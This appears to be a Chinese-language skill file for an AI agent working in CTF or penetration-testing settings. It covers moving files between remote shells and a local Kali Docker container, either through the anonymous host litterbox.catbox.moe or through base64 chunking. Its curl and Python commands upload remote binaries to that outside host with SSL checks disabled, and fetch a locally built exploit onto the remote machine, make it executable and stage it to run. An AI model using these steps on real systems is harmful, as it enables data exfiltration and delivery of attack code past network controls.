---
name: file-transfer
description: Use when transferring files between remote environments and local Docker containers via litterbox.catbox.moe relay or base64 chunked fallback
---

# File Transfer Skill

远程环境（web terminal、SSH session）与本地 Kali Docker 之间传输文件的标准流程。

**外部中转服务：litterbox.catbox.moe。** 

## Step 0：网络预检（必须先做）

在尝试任何传输前，先用一条命令检测出站 HTTPS 是否可达：

```bash
curl -k -s -o /dev/null -w "%{http_code}" --max-time 5 https://litterbox.catbox.moe/resources/internals/api.php
```

- 返回 `200` / `301` / `302` / `405` → 出站正常，使用 litterbox 方案
- 返回空 / `000` / 超时 / connection refused → **出站被封**，直接跳到「降级方案：base64 分块传输」，不要再尝试其他外部服务

如果远程没有 curl，用 python3 预检：

```bash
python3 -c "
import urllib.request, ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
r = urllib.request.urlopen('https://catbox.moe/', timeout=5, context=ctx)
print(r.status)
"
```

## 方案一：litterbox.catbox.moe 中转（出站正常时使用）

litterbox.catbox.moe 是临时文件分享服务，支持任意文件类型（包括裸二进制），无需注册。

### 上传 API

- **Endpoint**: `POST https://litterbox.catbox.moe/resources/internals/api.php`
- **必需字段**:
  - `reqtype=fileupload`（固定值）
  - `time=24h`（过期时间，可选：`1h`、`12h`、`24h`、`72h`）
  - `fileToUpload=@文件路径`（要上传的文件）
- **响应格式**: 纯文本，直接返回下载 URL（不是 JSON）
- **响应示例**:
  ```
  https://litter.catbox.moe/q29poh.txt
  ```
- **下载链接**: 响应内容本身就是下载 URL，直接使用

### 远程 → 本地（最常见场景）

场景：远程环境有一个二进制文件需要传到本地 Docker 分析。

```bash
# Step 1: 记录 md5 用于验证
md5sum /path/to/binary

# Step 2: 在远程环境上传文件（直接支持二进制，无需压缩）
curl -k -F "reqtype=fileupload" -F "time=1h" -F "fileToUpload=@/path/to/binary" https://litterbox.catbox.moe/resources/internals/api.php
# 直接返回下载 URL，例如: https://litter.catbox.moe/abc123

# Step 3: 在本地 Docker 下载（URL 来自上一步返回的纯文本）
curl -k -s https://litter.catbox.moe/abc123 -o /root/agent-work/binary

# Step 4: 验证完整性
md5sum /root/agent-work/binary   # 必须与远程端一致
```

**注意**：上传响应就是下载 URL 纯文本，不需要 JSON 解析。如果终端输出被截断或看不到，重新上传一次并仔细捕获输出。

### 本地 → 远程

场景：本地生成的 exploit/payload 需要传到远程执行。

```bash
# Step 1: 在本地 Docker 上传
curl -k -F "reqtype=fileupload" -F "time=24h" -F "fileToUpload=@/root/agent-work/exploit" https://litterbox.catbox.moe/resources/internals/api.php
# 返回下载 URL

# Step 2: 在远程环境下载
curl -k -s https://litter.catbox.moe/xxxxx -o /tmp/exploit && chmod +x /tmp/exploit
```

### 远程没有 curl 时的替代上传方式

```bash
# 使用 python3（大多数 Linux 都有）
python3 -c "
import urllib.request, json, ssl, os

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

filepath = '/path/to/binary'
filename = os.path.basename(filepath)
with open(filepath, 'rb') as f:
    data = f.read()

boundary = 'boundary123456'
body = b''
# reqtype 字段
body += f'--{boundary}\r\nContent-Disposition: form-data; name=\"reqtype\"\r\n\r\nfileupload\r\n'.encode()
# time 字段
body += f'--{boundary}\r\nContent-Disposition: form-data; name=\"time\"\r\n\r\n24h\r\n'.encode()
# 文件字段
body += (
    f'--{boundary}\r\n'
    f'Content-Disposition: form-data; name=\"fileToUpload\"; filename=\"{filename}\"\r\n'
    f'Content-Type: application/octet-stream\r\n\r\n'
).encode() + data + f'\r\n--{boundary}--\r\n'.encode()

req = urllib.request.Request(
    'https://litterbox.catbox.moe/resources/internals/api.php',
    data=body,
    headers={'Content-Type': f'multipart/form-data; boundary={boundary}'}
)
resp = urllib.request.urlopen(req, context=ctx)
url = resp.read().decode().strip()
print('Download URL:', url)
"
```

### litterbox.catbox.moe 特性

- **直接支持二进制文件**，无需 gzip 压缩
- 过期时间可选：1h / 12h / 24h / 72h
- 下载链接在过期前可多次使用
- 无需注册或认证
- 响应是纯文本 URL（不是 JSON），解析更简单
- 上传和下载使用同一主域（`catbox.moe`），不会出现子域名 DNS 污染问题

## 方案二（降级）：base64 分块传输（出站被封时使用）

当网络预检确认出站不通时，使用 base64 编码通过终端文本传输。适用于 **5MB 以内** 的文件。

### 远程 → 本地

```bash
# Step 1: 在远程环境检查文件大小
ls -lh /path/to/binary
md5sum /path/to/binary   # 记录用于验证

# Step 2: base64 编码并统计总行数
base64 /path/to/binary > /tmp/b64.txt
wc -l /tmp/b64.txt   # 假设输出 N 行

# Step 3: 分块读取（每次 200 行，根据终端缓冲区调整）
sed -n '1,200p' /tmp/b64.txt
sed -n '201,400p' /tmp/b64.txt
sed -n '401,600p' /tmp/b64.txt
# ... 直到读完全部 N 行
```

在本地 Docker 中重组：

```bash
# 将所有分块拼接写入文件（注意不要遗漏）
cat > /root/agent-work/b64.txt << 'ENDOFBASE64'
<粘贴所有 base64 分块，顺序不能乱>
ENDOFBASE64

# 解码
base64 -d /root/agent-work/b64.txt > /root/agent-work/binary

# 验证
md5sum /root/agent-work/binary   # 必须与远程端一致
```

### 本地 → 远程

同理反向操作：本地 base64 编码 → 分块输出 → 远程终端粘贴重组 → 解码。

### base64 传输注意事项

- 文件 > 5MB 时 base64 约产生 6.7MB 文本，分块次数过多容易出错，应优先尝试压缩：`gzip -k binary` 后再编码
- 每个分块读取后，通过终端 snapshot 捕获完整内容，**不要跳过或截断**
- 最终必须用 md5sum 验证，不一致则重传

## 传输后验证

无论使用哪种方式，传输后必须验证文件完整性：

```bash
# 两端分别执行，对比输出
md5sum /path/to/file
# 或
sha256sum /path/to/file
```

## 决策流程

```
1. ls -lh <file>  →  确认文件大小
2. 网络预检  →  curl -k -s -o /dev/null -w "%{http_code}" --max-time 5 https://litterbox.catbox.moe/resources/internals/api.php
     │
     ├─ 返回 2xx/3xx/4xx → 出站正常，使用 litterbox（方案一）
     │     ├─ 有 curl → curl -k -F "reqtype=fileupload" -F "time=24h" -F "fileToUpload=@file" https://litterbox.catbox.moe/resources/internals/api.php
     │     └─ 无 curl → python3 urllib 上传
     │
     └─ 超时/000/失败 → 使用 base64 分块（方案二）
           ├─ 文件 > 5MB → 先 gzip 压缩再编码
           └─ 文件 ≤ 5MB → 直接编码分块传输
3. 传输完成 → md5sum 验证
```

## 使用建议

1. **网络预检是第一步**，不要跳过直接尝试上传——失败了浪费大量工具调用
2. 传输前先确认文件大小：`ls -lh binary`
3. **无需压缩**——litterbox 直接支持二进制文件（大文件仍可选压缩减小体积）
4. 传输成功后立即设置执行权限：`chmod +x binary`
5. 上传响应就是下载 URL（纯文本），**不需要 JSON 解析**
6. **字段名是 `fileToUpload` 不是 `file`**，且必须带 `reqtype=fileupload` 和 `time=24h`

## 常见错误

**所有 curl 必须带 `-k`（跳过 SSL 验证）**。CTF 容器经常缺少 CA 证书包（`/etc/ssl/certs/ca-certificates.crt`），不加 `-k` 会导致 curl 因 SSL 错误静默失败（配合 `-s` 时无任何错误提示，返回空内容），被误判为网络不通。

错误示例（缺少 `-k`，SSL 失败但 `-s` 抑制了错误信息）：
```bash
curl -s -F "reqtype=fileupload" -F "time=1h" -F "fileToUpload=@file" https://litterbox.catbox.moe/resources/internals/api.php
# 返回空 → 误判为网络不通
```

正确做法：
```bash
curl -k -s -F "reqtype=fileupload" -F "time=1h" -F "fileToUpload=@file" https://litterbox.catbox.moe/resources/internals/api.php
# 正确返回下载 URL
```
